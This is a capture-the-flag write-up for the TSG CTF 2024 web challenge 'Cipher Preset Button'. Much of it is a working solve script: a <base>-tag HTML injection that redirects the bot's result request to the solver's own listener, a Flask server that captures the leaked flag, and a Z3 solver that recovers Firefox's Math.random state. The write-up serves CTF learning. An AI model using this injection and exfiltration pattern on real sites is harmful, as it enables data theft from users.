---
title: "Cipher Preset Button - TSG CTF 2024"
category: "web"
subcategory: "symbolic-execution"
type: "writeup"
tags: ["javascript", "web", "random", "injection", "html", "z3", "cors", "flask", "symbolic-execution", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "Solved by @ouuan and @NanoApe."
source:
  name: "CTFtime writeup #39709"
  url: "https://ctftime.org/writeup/39709"
original_source: "https://ouuan.moe/post/2024/12/tsgctf-2024-web#cipher-preset-button-19-solves"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "Cipher Preset Button"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** Cipher Preset Button
- **Author team:** blue-lotus
- **CTFtime tags:** javascript, web, random, injection, html, z3
- **CTFtime:** <https://ctftime.org/writeup/39709>
- **Original writeup:** <https://ouuan.moe/post/2024/12/tsgctf-2024-web#cipher-preset-button-19-solves>

---
Solved by @ouuan and @NanoApe.

### `<base>` redirecting

`meta` and `link` are not allowed in `titleElem`, but `<base>` is not banned in either HTML sanitizer or CSP, so we can change the base URI to redirect the request to `/result` to our server. Then we can use a 25-character prefix to get the first 25 characters of the flag.

### Crack `Math.random`

> `Math.random()` does not provide cryptographically secure random numbers. Do not use them for anything related to security. Use the Web Crypto API instead, and more precisely the [`Crypto.getRandomValues()`](<https://developer.mozilla.org/en-US/docs/Web/API/Crypto/getRandomValues>) method.

Using an empty prefix, we can get the first 25 `Math.floor(Math.random() * 65536)` and we need to predict the next 23.

There is <<https://github.com/d0nutptr/v8_rand_buster>>, and we need to adjust the random-state-to-double conversion part for Firefox. Refer to [XorShift128PlusRNG.h](<https://searchfox.org/mozilla-central/source/mfbt/XorShift128PlusRNG.h>).

```diff  
@@ -17,7 +17,7 @@ def xs128p(state0, state1):  
s1 ^= (s0 >> 26) & 0xFFFFFFFFFFFFFFFF  
state0 = state1 & 0xFFFFFFFFFFFFFFFF  
state1 = s1 & 0xFFFFFFFFFFFFFFFF  
\- generated = state0 & 0xFFFFFFFFFFFFFFFF  
\+ generated = (state0 + state1) & 0xFFFFFFFFFFFFFFFF  
```

```python  
def sym_floor_random(slvr, sym_state0, sym_state1, generated, multiple):  
sym_state0, sym_state1 = sym_xs128p(sym_state0, sym_state1)

calc = (sym_state0 + sym_state1) & BitVecVal((1 << 53) - 1, 64)

coef = (1 << 53) / multiple  
lower = int(generated * coef)  
upper = int((generated + 1) * coef)

slvr.add(ULE(BitVecVal(lower, 64), calc))  
slvr.add(ULE(calc, BitVecVal(upper, 64)))

return sym_state0, sym_state1

def to_double(value):  
return (value & ((1 << 53) - 1)) / (1 << 53)  
```

### Automatic solve script

I refined the script after the contest to make it fully automatic. (I don’t know why I did this, maybe just to save some explanations on how to run it :)

Z3 solving needs a few CPU hours, so be patient.

It needs public IPv4 access. Use services like [requestrepo.com](http://requestrepo.com) or [app.interactsh.com](http://app.interactsh.com) otherwise.

```python  
# Receive requests

from flask import Flask, request, make_response  
from threading import Thread

URL = "http://104.198.119.144:7891"  
PORT = 1337  
MAX_PREFIX_LEN = 25  
FLAG_LEN = 48

flag = ""

app = Flask(__name__)

@app.route("/result", methods=["OPTIONS"])  
def cors():  
response = make_response()  
response.headers["Access-Control-Allow-Origin"] = "*"  
response.headers["Access-Control-Allow-Headers"] = "Content-Type"  
return response

@app.post("/result")  
def post_result():  
global flag  
assert request.json  
prefix = request.json["prefix"]  
result = request.json["result"]  
if flag == "":  
for i in range(MAX_PREFIX_LEN):  
flag += chr(ord(prefix[i]) ^ int(result[i * 4 : i * 4 + 4], 16))  
print(flag)  
else:  
points = []  
for i in range(MAX_PREFIX_LEN):  
points.append(ord(flag[i]) ^ int(result[i * 4 : i * 4 + 4], 16))  
print("Start solving")  
seeds = solve(points, 65536)  
points = gen(seeds, 65536, FLAG_LEN)  
for i in range(MAX_PREFIX_LEN, FLAG_LEN):  
flag += chr(points[i] ^ int(result[i * 4 : i * 4 + 4], 16))  
print(flag)  
quit()  
return "ok"

Thread(target=lambda: app.run(host="0.0.0.0", port=PORT)).start()

# Send requests

import requests  
from time import sleep

requests.packages.urllib3.util.connection.HAS_IPV6 = False  
ip = requests.get("<https://ifconfig.me>").text  
name = f'</title><base href="http://{ip}:{PORT}"/><title>'

def report(prefix):  
res = [requests.post](http://requests.post)(f"{URL}/preset", json={"name": name, "prefix": prefix})  
id = res.json()["id"]  
res = [requests.post](http://requests.post)(f"{URL}/report", json={"path": f"/presets/{id}"})  
print(res.text)

report("A" * MAX_PREFIX_LEN)  
sleep(5)  
report("")

# Crack Math.random  
# <https://github.com/d0nutptr/v8_rand_buster>

from os import cpu_count  
from z3 import *

MAX_UNUSED_THREADS = 2

def xs128p(state0, state1):  
s1 = state0 & 0xFFFFFFFFFFFFFFFF  
s0 = state1 & 0xFFFFFFFFFFFFFFFF  
s1 ^= (s1 << 23) & 0xFFFFFFFFFFFFFFFF  
s1 ^= (s1 >> 17) & 0xFFFFFFFFFFFFFFFF  
s1 ^= s0 & 0xFFFFFFFFFFFFFFFF  
s1 ^= (s0 >> 26) & 0xFFFFFFFFFFFFFFFF  
state0 = state1 & 0xFFFFFFFFFFFFFFFF  
state1 = s1 & 0xFFFFFFFFFFFFFFFF  
generated = (state0 + state1) & 0xFFFFFFFFFFFFFFFF  
return state0, state1, generated

def sym_xs128p(sym_state0, sym_state1):  
s1 = sym_state0  
s0 = sym_state1  
s1 ^= s1 << 23  
s1 ^= LShR(s1, 17)  
s1 ^= s0  
s1 ^= LShR(s0, 26)  
sym_state0 = sym_state1  
sym_state1 = s1  
return sym_state0, sym_state1

def sym_floor_random(slvr, sym_state0, sym_state1, generated, multiple):  
sym_state0, sym_state1 = sym_xs128p(sym_state0, sym_state1)

calc = (sym_state0 + sym_state1) & BitVecVal((1 << 53) - 1, 64)

coef = (1 << 53) / multiple  
lower = int(generated * coef)  
upper = int((generated + 1) * coef)

slvr.add(ULE(BitVecVal(lower, 64), calc))  
slvr.add(ULE(calc, BitVecVal(upper, 64)))

return sym_state0, sym_state1

def solve(points, multiple):  
ostate0, ostate1 = BitVecs("ostate0 ostate1", 64)  
sym_state0 = ostate0  
sym_state1 = ostate1  
set_option("parallel.enable", True)  
set_option("parallel.threads.max", max(cpu_count() - MAX_UNUSED_THREADS, 1))  
slvr = SolverFor("QF_BV")

for point in points:  
sym_state0, sym_state1 = sym_floor_random(  
slvr, sym_state0, sym_state1, point, multiple  
)

assert slvr.check() == sat

m = slvr.model()  
state0 = m[ostate0].as_long()  
state1 = m[ostate1].as_long()  
return state0, state1

def to_double(value):  
return (value & ((1 << 53) - 1)) / (1 << 53)

def gen(seeds, multiple, count):  
state0, state1 = seeds  
points = []  
for _ in range(count):  
state0, state1, output = xs128p(state0, state1)  
points.append(math.floor(multiple * to_double(output)))  
return points  
```
